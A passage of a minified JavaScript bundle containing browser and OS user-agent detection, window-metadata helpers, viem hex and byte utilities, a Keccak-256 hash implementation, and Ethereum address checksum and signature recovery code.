      , _s = Rt$3.sign(vs, oe.secretKey.slice(0, 32));
    return on$2({
        header: st,
        payload: Es,
        signature: _s
    })
}
var __spreadArray = globalThis && globalThis.__spreadArray || function(q, U, Z) {
    if (Z || arguments.length === 2)
        for (var oe = 0, et = U.length, st; oe < et; oe++)
            (st || !(oe in U)) && (st || (st = Array.prototype.slice.call(U, 0, oe)),
            st[oe] = U[oe]);
    return q.concat(st || Array.prototype.slice.call(U))
}
  , BrowserInfo = function() {
    function q(U, Z, oe) {
        this.name = U,
        this.version = Z,
        this.os = oe,
        this.type = "browser"
    }
    return q
}()
  , NodeInfo = function() {
    function q(U) {
        this.version = U,
        this.type = "node",
        this.name = "node",
        this.os = process.platform
    }
    return q
}()
  , SearchBotDeviceInfo = function() {
    function q(U, Z, oe, et) {
        this.name = U,
        this.version = Z,
        this.os = oe,
        this.bot = et,
        this.type = "bot-device"
    }
    return q
}()
  , BotInfo = function() {
    function q() {
        this.type = "bot",
        this.bot = !0,
        this.name = "bot",
        this.version = null,
        this.os = null
    }
    return q
}()
  , ReactNativeInfo = function() {
    function q() {
        this.type = "react-native",
        this.name = "react-native",
        this.version = null,
        this.os = null
    }
    return q
}()
  , SEARCHBOX_UA_REGEX = /alexa|bot|crawl(er|ing)|facebookexternalhit|feedburner|google web preview|nagios|postrank|pingdom|slurp|spider|yahoo!|yandex/
  , SEARCHBOT_OS_REGEX = /(nuhk|curl|Googlebot|Yammybot|Openbot|Slurp|MSNBot|Ask\ Jeeves\/Teoma|ia_archiver)/
  , REQUIRED_VERSION_PARTS = 3
  , userAgentRules = [["aol", /AOLShield\/([0-9\._]+)/], ["edge", /Edge\/([0-9\._]+)/], ["edge-ios", /EdgiOS\/([0-9\._]+)/], ["yandexbrowser", /YaBrowser\/([0-9\._]+)/], ["kakaotalk", /KAKAOTALK\s([0-9\.]+)/], ["samsung", /SamsungBrowser\/([0-9\.]+)/], ["silk", /\bSilk\/([0-9._-]+)\b/], ["miui", /MiuiBrowser\/([0-9\.]+)$/], ["beaker", /BeakerBrowser\/([0-9\.]+)/], ["edge-chromium", /EdgA?\/([0-9\.]+)/], ["chromium-webview", /(?!Chrom.*OPR)wv\).*Chrom(?:e|ium)\/([0-9\.]+)(:?\s|$)/], ["chrome", /(?!Chrom.*OPR)Chrom(?:e|ium)\/([0-9\.]+)(:?\s|$)/], ["phantomjs", /PhantomJS\/([0-9\.]+)(:?\s|$)/], ["crios", /CriOS\/([0-9\.]+)(:?\s|$)/], ["firefox", /Firefox\/([0-9\.]+)(?:\s|$)/], ["fxios", /FxiOS\/([0-9\.]+)/], ["opera-mini", /Opera Mini.*Version\/([0-9\.]+)/], ["opera", /Opera\/([0-9\.]+)(?:\s|$)/], ["opera", /OPR\/([0-9\.]+)(:?\s|$)/], ["pie", /^Microsoft Pocket Internet Explorer\/(\d+\.\d+)$/], ["pie", /^Mozilla\/\d\.\d+\s\(compatible;\s(?:MSP?IE|MSInternet Explorer) (\d+\.\d+);.*Windows CE.*\)$/], ["netfront", /^Mozilla\/\d\.\d+.*NetFront\/(\d.\d)/], ["ie", /Trident\/7\.0.*rv\:([0-9\.]+).*\).*Gecko$/], ["ie", /MSIE\s([0-9\.]+);.*Trident\/[4-7].0/], ["ie", /MSIE\s(7\.0)/], ["bb10", /BB10;\sTouch.*Version\/([0-9\.]+)/], ["android", /Android\s([0-9\.]+)/], ["ios", /Version\/([0-9\._]+).*Mobile.*Safari.*/], ["safari", /Version\/([0-9\._]+).*Safari/], ["facebook", /FB[AS]V\/([0-9\.]+)/], ["instagram", /Instagram\s([0-9\.]+)/], ["ios-webview", /AppleWebKit\/([0-9\.]+).*Mobile/], ["ios-webview", /AppleWebKit\/([0-9\.]+).*Gecko\)$/], ["curl", /^curl\/([0-9\.]+)$/], ["searchbot", SEARCHBOX_UA_REGEX]]
  , operatingSystemRules = [["iOS", /iP(hone|od|ad)/], ["Android OS", /Android/], ["BlackBerry OS", /BlackBerry|BB10/], ["Windows Mobile", /IEMobile/], ["Amazon OS", /Kindle/], ["Windows 3.11", /Win16/], ["Windows 95", /(Windows 95)|(Win95)|(Windows_95)/], ["Windows 98", /(Windows 98)|(Win98)/], ["Windows 2000", /(Windows NT 5.0)|(Windows 2000)/], ["Windows XP", /(Windows NT 5.1)|(Windows XP)/], ["Windows Server 2003", /(Windows NT 5.2)/], ["Windows Vista", /(Windows NT 6.0)/], ["Windows 7", /(Windows NT 6.1)/], ["Windows 8", /(Windows NT 6.2)/], ["Windows 8.1", /(Windows NT 6.3)/], ["Windows 10", /(Windows NT 10.0)/], ["Windows ME", /Windows ME/], ["Windows CE", /Windows CE|WinCE|Microsoft Pocket Internet Explorer/], ["Open BSD", /OpenBSD/], ["Sun OS", /SunOS/], ["Chrome OS", /CrOS/], ["Linux", /(Linux)|(X11)/], ["Mac OS", /(Mac_PowerPC)|(Macintosh)/], ["QNX", /QNX/], ["BeOS", /BeOS/], ["OS/2", /OS\/2/]];
function detect(q) {
    return q ? parseUserAgent(q) : typeof document > "u" && typeof navigator < "u" && navigator.product === "ReactNative" ? new ReactNativeInfo : typeof navigator < "u" ? parseUserAgent(navigator.userAgent) : getNodeVersion()
}
function matchUserAgent(q) {
    return q !== "" && userAgentRules.reduce(function(U, Z) {
        var oe = Z[0]
          , et = Z[1];
        if (U)
            return U;
        var st = et.exec(q);
        return !!st && [oe, st]
    }, !1)
}
function parseUserAgent(q) {
    var U = matchUserAgent(q);
    if (!U)
        return null;
    var Z = U[0]
      , oe = U[1];
    if (Z === "searchbot")
        return new BotInfo;
    var et = oe[1] && oe[1].split(".").join("_").split("_").slice(0, 3);
    et ? et.length < REQUIRED_VERSION_PARTS && (et = __spreadArray(__spreadArray([], et, !0), createVersionParts(REQUIRED_VERSION_PARTS - et.length), !0)) : et = [];
    var st = et.join(".")
      , ws = detectOS(q)
      , ms = SEARCHBOT_OS_REGEX.exec(q);
    return ms && ms[1] ? new SearchBotDeviceInfo(Z,st,ws,ms[1]) : new BrowserInfo(Z,st,ws)
}
function detectOS(q) {
    for (var U = 0, Z = operatingSystemRules.length; U < Z; U++) {
        var oe = operatingSystemRules[U]
          , et = oe[0]
          , st = oe[1]
          , ws = st.exec(q);
        if (ws)
            return et
    }
    return null
}
function getNodeVersion() {
    var q = typeof process < "u" && process.version;
    return q ? new NodeInfo(process.version.slice(1)) : null
}
function createVersionParts(q) {
    for (var U = [], Z = 0; Z < q; Z++)
        U.push("0");
    return U
}
var cjs$2 = {};
Object.defineProperty(cjs$2, "__esModule", {
    value: !0
});
cjs$2.getLocalStorage = cjs$2.getLocalStorageOrThrow = cjs$2.getCrypto = cjs$2.getCryptoOrThrow = getLocation_1 = cjs$2.getLocation = cjs$2.getLocationOrThrow = getNavigator_1 = cjs$2.getNavigator = cjs$2.getNavigatorOrThrow = getDocument_1 = cjs$2.getDocument = cjs$2.getDocumentOrThrow = cjs$2.getFromWindowOrThrow = cjs$2.getFromWindow = void 0;
function getFromWindow(q) {
    let U;
    return typeof window < "u" && typeof window[q] < "u" && (U = window[q]),
    U
}
cjs$2.getFromWindow = getFromWindow;
function getFromWindowOrThrow(q) {
    const U = getFromWindow(q);
    if (!U)
        throw new Error(`${q} is not defined in Window`);
    return U
}
cjs$2.getFromWindowOrThrow = getFromWindowOrThrow;
function getDocumentOrThrow() {
    return getFromWindowOrThrow("document")
}
cjs$2.getDocumentOrThrow = getDocumentOrThrow;
function getDocument() {
    return getFromWindow("document")
}
var getDocument_1 = cjs$2.getDocument = getDocument;
function getNavigatorOrThrow() {
    return getFromWindowOrThrow("navigator")
}
cjs$2.getNavigatorOrThrow = getNavigatorOrThrow;
function getNavigator() {
    return getFromWindow("navigator")
}
var getNavigator_1 = cjs$2.getNavigator = getNavigator;
function getLocationOrThrow() {
    return getFromWindowOrThrow("location")
}
cjs$2.getLocationOrThrow = getLocationOrThrow;
function getLocation() {
    return getFromWindow("location")
}
var getLocation_1 = cjs$2.getLocation = getLocation;
function getCryptoOrThrow() {
    return getFromWindowOrThrow("crypto")
}
cjs$2.getCryptoOrThrow = getCryptoOrThrow;
function getCrypto() {
    return getFromWindow("crypto")
}
cjs$2.getCrypto = getCrypto;
function getLocalStorageOrThrow() {
    return getFromWindowOrThrow("localStorage")
}
cjs$2.getLocalStorageOrThrow = getLocalStorageOrThrow;
function getLocalStorage() {
    return getFromWindow("localStorage")
}
cjs$2.getLocalStorage = getLocalStorage;
var cjs$1 = {};
Object.defineProperty(cjs$1, "__esModule", {
    value: !0
});
var getWindowMetadata_1 = cjs$1.getWindowMetadata = void 0;
const window_getters_1 = cjs$2;
function getWindowMetadata() {
    let q, U;
    try {
        q = window_getters_1.getDocumentOrThrow(),
        U = window_getters_1.getLocationOrThrow()
    } catch {
        return null
    }
    function Z() {
        const Is = q.getElementsByTagName("link")
          , Ss = [];
        for (let Ts = 0; Ts < Is.length; Ts++) {
            const Rs = Is[Ts]
              , Ns = Rs.getAttribute("rel");
            if (Ns && Ns.toLowerCase().indexOf("icon") > -1) {
                const Hs = Rs.getAttribute("href");
                if (Hs)
                    if (Hs.toLowerCase().indexOf("https:") === -1 && Hs.toLowerCase().indexOf("http:") === -1 && Hs.indexOf("//") !== 0) {
                        let ha = U.protocol + "//" + U.host;
                        if (Hs.indexOf("/") === 0)
                            ha += Hs;
                        else {
                            const pa = U.pathname.split("/");
                            pa.pop();
                            const Zs = pa.join("/");
                            ha += Zs + "/" + Hs
                        }
                        Ss.push(ha)
                    } else if (Hs.indexOf("//") === 0) {
                        const ha = U.protocol + Hs;
                        Ss.push(ha)
                    } else
                        Ss.push(Hs)
            }
        }
        return Ss
    }
    function oe(...Is) {
        const Ss = q.getElementsByTagName("meta");
        for (let Ts = 0; Ts < Ss.length; Ts++) {
            const Rs = Ss[Ts]
              , Ns = ["itemprop", "property", "name"].map(Hs => Rs.getAttribute(Hs)).filter(Hs => Hs ? Is.includes(Hs) : !1);
            if (Ns.length && Ns) {
                const Hs = Rs.getAttribute("content");
                if (Hs)
                    return Hs
            }
        }
        return ""
    }
    function et() {
        let Is = oe("name", "og:site_name", "og:title", "twitter:title");
        return Is || (Is = q.title),
        Is
    }
    function st() {
        return oe("description", "og:description", "twitter:description", "keywords")
    }
    const ws = et()
      , ms = st()
      , Es = U.origin
      , vs = Z();
    return {
        description: ms,
        url: Es,
        icons: vs,
        name: ws
    }
}
getWindowMetadata_1 = cjs$1.getWindowMetadata = getWindowMetadata;
function isHex(q, {strict: U=!0}={}) {
    return !q || typeof q != "string" ? !1 : U ? /^0x[0-9a-fA-F]*$/.test(q) : q.startsWith("0x")
}
function size(q) {
    return isHex(q, {
        strict: !1
    }) ? Math.ceil((q.length - 2) / 2) : q.length
}
const version = "2.31.0";
let errorConfig = {
    getDocsUrl: ({docsBaseUrl: q, docsPath: U="", docsSlug: Z}) => U ? `${q ?? "https://viem.sh"}${U}${Z ? `#${Z}` : ""}` : void 0,
    version: `viem@${version}`
};
class BaseError extends Error {
    constructor(U, Z={}) {
        var ms;
        const oe = ( () => {
            var Es;
            return Z.cause instanceof BaseError ? Z.cause.details : (Es = Z.cause) != null && Es.message ? Z.cause.message : Z.details
        }
        )()
          , et = ( () => Z.cause instanceof BaseError && Z.cause.docsPath || Z.docsPath)()
          , st = (ms = errorConfig.getDocsUrl) == null ? void 0 : ms.call(errorConfig, {
            ...Z,
            docsPath: et
        })
          , ws = [U || "An error occurred.", "", ...Z.metaMessages ? [...Z.metaMessages, ""] : [], ...st ? [`Docs: ${st}`] : [], ...oe ? [`Details: ${oe}`] : [], ...errorConfig.version ? [`Version: ${errorConfig.version}`] : []].join(`
`);
        super(ws, Z.cause ? {
            cause: Z.cause
        } : void 0),
        Object.defineProperty(this, "details", {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: void 0
        }),
        Object.defineProperty(this, "docsPath", {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: void 0
        }),
        Object.defineProperty(this, "metaMessages", {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: void 0
        }),
        Object.defineProperty(this, "shortMessage", {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: void 0
        }),
        Object.defineProperty(this, "version", {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: void 0
        }),
        Object.defineProperty(this, "name", {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: "BaseError"
        }),
        this.details = oe,
        this.docsPath = et,
        this.metaMessages = Z.metaMessages,
        this.name = Z.name ?? this.name,
        this.shortMessage = U,
        this.version = version
    }
    walk(U) {
        return walk(this, U)
    }
}
function walk(q, U) {
    return U != null && U(q) ? q : q && typeof q == "object" && "cause"in q && q.cause !== void 0 ? walk(q.cause, U) : U ? null : q
}
class SizeExceedsPaddingSizeError extends BaseError {
    constructor({size: U, targetSize: Z, type: oe}) {
        super(`${oe.charAt(0).toUpperCase()}${oe.slice(1).toLowerCase()} size (${U}) exceeds padding size (${Z}).`, {
            name: "SizeExceedsPaddingSizeError"
        })
    }
}
function pad(q, {dir: U, size: Z=32}={}) {
    return typeof q == "string" ? padHex(q, {
        dir: U,
        size: Z
    }) : padBytes(q, {
        dir: U,
        size: Z
    })
}
function padHex(q, {dir: U, size: Z=32}={}) {
    if (Z === null)
        return q;
    const oe = q.replace("0x", "");
    if (oe.length > Z * 2)
        throw new SizeExceedsPaddingSizeError({
            size: Math.ceil(oe.length / 2),
            targetSize: Z,
            type: "hex"
        });
    return `0x${oe[U === "right" ? "padEnd" : "padStart"](Z * 2, "0")}`
}
function padBytes(q, {dir: U, size: Z=32}={}) {
    if (Z === null)
        return q;
    if (q.length > Z)
        throw new SizeExceedsPaddingSizeError({
            size: q.length,
            targetSize: Z,
            type: "bytes"
        });
    const oe = new Uint8Array(Z);
    for (let et = 0; et < Z; et++) {
        const st = U === "right";
        oe[st ? et : Z - et - 1] = q[st ? et : q.length - et - 1]
    }
    return oe
}
class IntegerOutOfRangeError extends BaseError {
    constructor({max: U, min: Z, signed: oe, size: et, value: st}) {
        super(`Number "${st}" is not in safe ${et ? `${et * 8}-bit ${oe ? "signed" : "unsigned"} ` : ""}integer range ${U ? `(${Z} to ${U})` : `(above ${Z})`}`, {
            name: "IntegerOutOfRangeError"
        })
    }
}
class SizeOverflowError extends BaseError {
    constructor({givenSize: U, maxSize: Z}) {
        super(`Size cannot exceed ${Z} bytes. Given size: ${U} bytes.`, {
            name: "SizeOverflowError"
        })
    }
}
function assertSize(q, {size: U}) {
    if (size(q) > U)
        throw new SizeOverflowError({
            givenSize: size(q),
            maxSize: U
        })
}
function hexToBigInt(q, U={}) {
    const {signed: Z} = U;
    U.size && assertSize(q, {
        size: U.size
    });
    const oe = BigInt(q);
    if (!Z)
        return oe;
    const et = (q.length - 2) / 2
      , st = (1n << BigInt(et) * 8n - 1n) - 1n;
    return oe <= st ? oe : oe - BigInt(`0x${"f".padStart(et * 2, "f")}`) - 1n
}
function hexToNumber(q, U={}) {
    return Number(hexToBigInt(q, U))
}
const hexes = Array.from({
    length: 256
}, (q, U) => U.toString(16).padStart(2, "0"));
function toHex$1(q, U={}) {
    return typeof q == "number" || typeof q == "bigint" ? numberToHex(q, U) : typeof q == "string" ? stringToHex(q, U) : typeof q == "boolean" ? boolToHex(q, U) : bytesToHex(q, U)
}
function boolToHex(q, U={}) {
    const Z = `0x${Number(q)}`;
    return typeof U.size == "number" ? (assertSize(Z, {
        size: U.size
    }),
    pad(Z, {
        size: U.size
    })) : Z
}
function bytesToHex(q, U={}) {
    let Z = "";
    for (let et = 0; et < q.length; et++)
        Z += hexes[q[et]];
    const oe = `0x${Z}`;
    return typeof U.size == "number" ? (assertSize(oe, {
        size: U.size
    }),
    pad(oe, {
        dir: "right",
        size: U.size
    })) : oe
}
function numberToHex(q, U={}) {
    const {signed: Z, size: oe} = U
      , et = BigInt(q);
    let st;
    oe ? Z ? st = (1n << BigInt(oe) * 8n - 1n) - 1n : st = 2n ** (BigInt(oe) * 8n) - 1n : typeof q == "number" && (st = BigInt(Number.MAX_SAFE_INTEGER));
    const ws = typeof st == "bigint" && Z ? -st - 1n : 0;
    if (st && et > st || et < ws) {
        const Es = typeof q == "bigint" ? "n" : "";
        throw new IntegerOutOfRangeError({
            max: st ? `${st}${Es}` : void 0,
            min: `${ws}${Es}`,
            signed: Z,
            size: oe,
            value: `${q}${Es}`
        })
    }
    const ms = `0x${(Z && et < 0 ? (1n << BigInt(oe * 8)) + BigInt(et) : et).toString(16)}`;
    return oe ? pad(ms, {
        size: oe
    }) : ms
}
const encoder$1 = new TextEncoder;
function stringToHex(q, U={}) {
    const Z = encoder$1.encode(q);
    return bytesToHex(Z, U)
}
const encoder = new TextEncoder;
function toBytes$1(q, U={}) {
    return typeof q == "number" || typeof q == "bigint" ? numberToBytes(q, U) : typeof q == "boolean" ? boolToBytes(q, U) : isHex(q) ? hexToBytes(q, U) : stringToBytes(q, U)
}
function boolToBytes(q, U={}) {
    const Z = new Uint8Array(1);
    return Z[0] = Number(q),
    typeof U.size == "number" ? (assertSize(Z, {
        size: U.size
    }),
    pad(Z, {
        size: U.size
    })) : Z
}
const charCodeMap = {
    zero: 48,
    nine: 57,
    A: 65,
    F: 70,
    a: 97,
    f: 102
};
function charCodeToBase16(q) {
    if (q >= charCodeMap.zero && q <= charCodeMap.nine)
        return q - charCodeMap.zero;
    if (q >= charCodeMap.A && q <= charCodeMap.F)
        return q - (charCodeMap.A - 10);
    if (q >= charCodeMap.a && q <= charCodeMap.f)
        return q - (charCodeMap.a - 10)
}
function hexToBytes(q, U={}) {
    let Z = q;
    U.size && (assertSize(Z, {
        size: U.size
    }),
    Z = pad(Z, {
        dir: "right",
        size: U.size
    }));
    let oe = Z.slice(2);
    oe.length % 2 && (oe = `0${oe}`);
    const et = oe.length / 2
      , st = new Uint8Array(et);
    for (let ws = 0, ms = 0; ws < et; ws++) {
        const Es = charCodeToBase16(oe.charCodeAt(ms++))
          , vs = charCodeToBase16(oe.charCodeAt(ms++));
        if (Es === void 0 || vs === void 0)
            throw new BaseError(`Invalid byte sequence ("${oe[ms - 2]}${oe[ms - 1]}" in "${oe}").`);
        st[ws] = Es * 16 + vs
    }
    return st
}
function numberToBytes(q, U) {
    const Z = numberToHex(q, U);
    return hexToBytes(Z)
}
function stringToBytes(q, U={}) {
    const Z = encoder.encode(q);
    return typeof U.size == "number" ? (assertSize(Z, {
        size: U.size
    }),
    pad(Z, {
        dir: "right",
        size: U.size
    })) : Z
}
const U32_MASK64 = BigInt(2 ** 32 - 1)
  , _32n = BigInt(32);
function fromBig(q, U=!1) {
    return U ? {
        h: Number(q & U32_MASK64),
        l: Number(q >> _32n & U32_MASK64)
    } : {
        h: Number(q >> _32n & U32_MASK64) | 0,
        l: Number(q & U32_MASK64) | 0
    }
}
function split(q, U=!1) {
    const Z = q.length;
    let oe = new Uint32Array(Z)
      , et = new Uint32Array(Z);
    for (let st = 0; st < Z; st++) {
        const {h: ws, l: ms} = fromBig(q[st], U);
        [oe[st],et[st]] = [ws, ms]
    }
    return [oe, et]
}
const rotlSH = (q, U, Z) => q << Z | U >>> 32 - Z
  , rotlSL = (q, U, Z) => U << Z | q >>> 32 - Z
  , rotlBH = (q, U, Z) => U << Z - 32 | q >>> 64 - Z
  , rotlBL = (q, U, Z) => q << Z - 32 | U >>> 64 - Z
  , crypto$2 = typeof globalThis == "object" && "crypto"in globalThis ? globalThis.crypto : void 0;
/*! noble-hashes - MIT License (c) 2022 Paul Miller (paulmillr.com) */
function isBytes$1(q) {
    return q instanceof Uint8Array || ArrayBuffer.isView(q) && q.constructor.name === "Uint8Array"
}
function anumber$1(q) {
    if (!Number.isSafeInteger(q) || q < 0)
        throw new Error("positive integer expected, got " + q)
}
function abytes(q, ...U) {
    if (!isBytes$1(q))
        throw new Error("Uint8Array expected");
    if (U.length > 0 && !U.includes(q.length))
        throw new Error("Uint8Array expected of length " + U + ", got length=" + q.length)
}
function ahash(q) {
    if (typeof q != "function" || typeof q.create != "function")
        throw new Error("Hash should be wrapped by utils.createHasher");
    anumber$1(q.outputLen),
    anumber$1(q.blockLen)
}
function aexists(q, U=!0) {
    if (q.destroyed)
        throw new Error("Hash instance has been destroyed");
    if (U && q.finished)
        throw new Error("Hash#digest() has already been called")
}
function aoutput(q, U) {
    abytes(q);
    const Z = U.outputLen;
    if (q.length < Z)
        throw new Error("digestInto() expects output buffer of length at least " + Z)
}
function u32(q) {
    return new Uint32Array(q.buffer,q.byteOffset,Math.floor(q.byteLength / 4))
}
function clean(...q) {
    for (let U = 0; U < q.length; U++)
        q[U].fill(0)
}
function createView(q) {
    return new DataView(q.buffer,q.byteOffset,q.byteLength)
}
function rotr(q, U) {
    return q << 32 - U | q >>> U
}
const isLE = ( () => new Uint8Array(new Uint32Array([287454020]).buffer)[0] === 68)();
function byteSwap(q) {
    return q << 24 & 4278190080 | q << 8 & 16711680 | q >>> 8 & 65280 | q >>> 24 & 255
}
function byteSwap32(q) {
    for (let U = 0; U < q.length; U++)
        q[U] = byteSwap(q[U]);
    return q
}
const swap32IfBE = isLE ? q => q : byteSwap32;
function utf8ToBytes(q) {
    if (typeof q != "string")
        throw new Error("string expected");
    return new Uint8Array(new TextEncoder().encode(q))
}
function toBytes(q) {
    return typeof q == "string" && (q = utf8ToBytes(q)),
    abytes(q),
    q
}
function concatBytes(...q) {
    let U = 0;
    for (let oe = 0; oe < q.length; oe++) {
        const et = q[oe];
        abytes(et),
        U += et.length
    }
    const Z = new Uint8Array(U);
    for (let oe = 0, et = 0; oe < q.length; oe++) {
        const st = q[oe];
        Z.set(st, et),
        et += st.length
    }
    return Z
}
class Hash {
}
function createHasher(q) {
    const U = oe => q().update(toBytes(oe)).digest()
      , Z = q();
    return U.outputLen = Z.outputLen,
    U.blockLen = Z.blockLen,
    U.create = () => q(),
    U
}
function randomBytes(q=32) {
    if (crypto$2 && typeof crypto$2.getRandomValues == "function")
        return crypto$2.getRandomValues(new Uint8Array(q));
    if (crypto$2 && typeof crypto$2.randomBytes == "function")
        return Uint8Array.from(crypto$2.randomBytes(q));
    throw new Error("crypto.getRandomValues must be defined")
}
const _0n = BigInt(0)
  , _1n = BigInt(1)
  , _2n = BigInt(2)
  , _7n = BigInt(7)
  , _256n = BigInt(256)
  , _0x71n = BigInt(113)
  , SHA3_PI = []
  , SHA3_ROTL = []
  , _SHA3_IOTA = [];
for (let q = 0, U = _1n, Z = 1, oe = 0; q < 24; q++) {
    [Z,oe] = [oe, (2 * Z + 3 * oe) % 5],
    SHA3_PI.push(2 * (5 * oe + Z)),
    SHA3_ROTL.push((q + 1) * (q + 2) / 2 % 64);
    let et = _0n;
    for (let st = 0; st < 7; st++)
        U = (U << _1n ^ (U >> _7n) * _0x71n) % _256n,
        U & _2n && (et ^= _1n << (_1n << BigInt(st)) - _1n);
    _SHA3_IOTA.push(et)
}
const IOTAS = split(_SHA3_IOTA, !0)
  , SHA3_IOTA_H = IOTAS[0]
  , SHA3_IOTA_L = IOTAS[1]
  , rotlH = (q, U, Z) => Z > 32 ? rotlBH(q, U, Z) : rotlSH(q, U, Z)
  , rotlL = (q, U, Z) => Z > 32 ? rotlBL(q, U, Z) : rotlSL(q, U, Z);
function keccakP(q, U=24) {
    const Z = new Uint32Array(10);
    for (let oe = 24 - U; oe < 24; oe++) {
        for (let ws = 0; ws < 10; ws++)
            Z[ws] = q[ws] ^ q[ws + 10] ^ q[ws + 20] ^ q[ws + 30] ^ q[ws + 40];
        for (let ws = 0; ws < 10; ws += 2) {
            const ms = (ws + 8) % 10
              , Es = (ws + 2) % 10
              , vs = Z[Es]
              , _s = Z[Es + 1]
              , Is = rotlH(vs, _s, 1) ^ Z[ms]
              , Ss = rotlL(vs, _s, 1) ^ Z[ms + 1];
            for (let Ts = 0; Ts < 50; Ts += 10)
                q[ws + Ts] ^= Is,
                q[ws + Ts + 1] ^= Ss
        }
        let et = q[2]
          , st = q[3];
        for (let ws = 0; ws < 24; ws++) {
            const ms = SHA3_ROTL[ws]
              , Es = rotlH(et, st, ms)
              , vs = rotlL(et, st, ms)
              , _s = SHA3_PI[ws];
            et = q[_s],
            st = q[_s + 1],
            q[_s] = Es,
            q[_s + 1] = vs
        }
        for (let ws = 0; ws < 50; ws += 10) {
            for (let ms = 0; ms < 10; ms++)
                Z[ms] = q[ws + ms];
            for (let ms = 0; ms < 10; ms++)
                q[ws + ms] ^= ~Z[(ms + 2) % 10] & Z[(ms + 4) % 10]
        }
        q[0] ^= SHA3_IOTA_H[oe],
        q[1] ^= SHA3_IOTA_L[oe]
    }
    clean(Z)
}
class Keccak extends Hash {
    constructor(U, Z, oe, et=!1, st=24) {
        if (super(),
        this.pos = 0,
        this.posOut = 0,
        this.finished = !1,
        this.destroyed = !1,
        this.enableXOF = !1,
        this.blockLen = U,
        this.suffix = Z,
        this.outputLen = oe,
        this.enableXOF = et,
        this.rounds = st,
        anumber$1(oe),
        !(0 < U && U < 200))
            throw new Error("only keccak-f1600 function is supported");
        this.state = new Uint8Array(200),
        this.state32 = u32(this.state)
    }
    clone() {
        return this._cloneInto()
    }
    keccak() {
        swap32IfBE(this.state32),
        keccakP(this.state32, this.rounds),
        swap32IfBE(this.state32),
        this.posOut = 0,
        this.pos = 0
    }
    update(U) {
        aexists(this),
        U = toBytes(U),
        abytes(U);
        const {blockLen: Z, state: oe} = this
          , et = U.length;
        for (let st = 0; st < et; ) {
            const ws = Math.min(Z - this.pos, et - st);
            for (let ms = 0; ms < ws; ms++)
                oe[this.pos++] ^= U[st++];
            this.pos === Z && this.keccak()
        }
        return this
    }
    finish() {
        if (this.finished)
            return;
        this.finished = !0;
        const {state: U, suffix: Z, pos: oe, blockLen: et} = this;
        U[oe] ^= Z,
        Z & 128 && oe === et - 1 && this.keccak(),
        U[et - 1] ^= 128,
        this.keccak()
    }
    writeInto(U) {
        aexists(this, !1),
        abytes(U),
        this.finish();
        const Z = this.state
          , {blockLen: oe} = this;
        for (let et = 0, st = U.length; et < st; ) {
            this.posOut >= oe && this.keccak();
            const ws = Math.min(oe - this.posOut, st - et);
            U.set(Z.subarray(this.posOut, this.posOut + ws), et),
            this.posOut += ws,
            et += ws
        }
        return U
    }
    xofInto(U) {
        if (!this.enableXOF)
            throw new Error("XOF is not possible for this instance");
        return this.writeInto(U)
    }
    xof(U) {
        return anumber$1(U),
        this.xofInto(new Uint8Array(U))
    }
    digestInto(U) {
        if (aoutput(U, this),
        this.finished)
            throw new Error("digest() was already called");
        return this.writeInto(U),
        this.destroy(),
        U
    }
    digest() {
        return this.digestInto(new Uint8Array(this.outputLen))
    }
    destroy() {
        this.destroyed = !0,
        clean(this.state)
    }
    _cloneInto(U) {
        const {blockLen: Z, suffix: oe, outputLen: et, rounds: st, enableXOF: ws} = this;
        return U || (U = new Keccak(Z,oe,et,ws,st)),
        U.state32.set(this.state32),
        U.pos = this.pos,
        U.posOut = this.posOut,
        U.finished = this.finished,
        U.rounds = st,
        U.suffix = oe,
        U.outputLen = et,
        U.enableXOF = ws,
        U.destroyed = this.destroyed,
        U
    }
}
const gen = (q, U, Z) => createHasher( () => new Keccak(U,q,Z))
  , keccak_256 = ( () => gen(1, 136, 256 / 8))();
function keccak256(q, U) {
    const Z = U || "hex"
      , oe = keccak_256(isHex(q, {
        strict: !1
    }) ? toBytes$1(q) : q);
    return Z === "bytes" ? oe : toHex$1(oe)
}
class LruMap extends Map {
    constructor(U) {
        super(),
        Object.defineProperty(this, "maxSize", {
            enumerable: !0,
            configurable: !0,
            writable: !0,
            value: void 0
        }),
        this.maxSize = U
    }
    get(U) {
        const Z = super.get(U);
        return super.has(U) && Z !== void 0 && (this.delete(U),
        super.set(U, Z)),
        Z
    }
    set(U, Z) {
        if (super.set(U, Z),
        this.maxSize && this.size > this.maxSize) {
            const oe = this.keys().next().value;
            oe && this.delete(oe)
        }
        return this
    }
}
const checksumAddressCache = new LruMap(8192);
function checksumAddress(q, U) {
    if (checksumAddressCache.has(`${q}.${U}`))
        return checksumAddressCache.get(`${q}.${U}`);
    const Z = U ? `${U}${q.toLowerCase()}` : q.substring(2).toLowerCase()
      , oe = keccak256(stringToBytes(Z), "bytes")
      , et = (U ? Z.substring(`${U}0x`.length) : Z).split("");
    for (let ws = 0; ws < 40; ws += 2)
        oe[ws >> 1] >> 4 >= 8 && et[ws] && (et[ws] = et[ws].toUpperCase()),
        (oe[ws >> 1] & 15) >= 8 && et[ws + 1] && (et[ws + 1] = et[ws + 1].toUpperCase());
    const st = `0x${et.join("")}`;
    return checksumAddressCache.set(`${q}.${U}`, st),
    st
}
function publicKeyToAddress(q) {
    const U = keccak256(`0x${q.substring(4)}`).substring(26);
    return checksumAddress(`0x${U}`)
}
async function recoverPublicKey({hash: q, signature: U}) {
    const Z = isHex(q) ? q : toHex$1(q)
      , {secp256k1: oe} = await __vitePreload( () => import("./secp256k1-656791ff.js"), []);
    return `0x${( () => {
        if (typeof U == "object" && "r"in U && "s"in U) {
            const {r: vs, s: _s, v: Is, yParity: Ss} = U
              , Ts = Number(Ss ?? Is)
              , Rs = toRecoveryBit(Ts);
            return new oe.Signature(hexToBigInt(vs),hexToBigInt(_s)).addRecoveryBit(Rs)
        }
        const ws = isHex(U) ? U : toHex$1(U);
        if (size(ws) !== 65)
            throw new Error("invalid signature length");
        const ms = hexToNumber(`0x${ws.slice(130)}`)
          , Es = toRecoveryBit(ms);
        return oe.Signature.fromCompact(ws.substring(2, 130)).addRecoveryBit(Es)
    }
    )().recoverPublicKey(Z.substring(2)).toHex(!1)}`
}
function toRecoveryBit(q) {
    if (q === 0 || q === 1)
        return q;
    if (q === 27)
        return 0;
    if (q === 28)
        return 1;
    throw new Error("Invalid yParityOrV value")
}
async function recoverAddress({hash: q, signature: U}) {
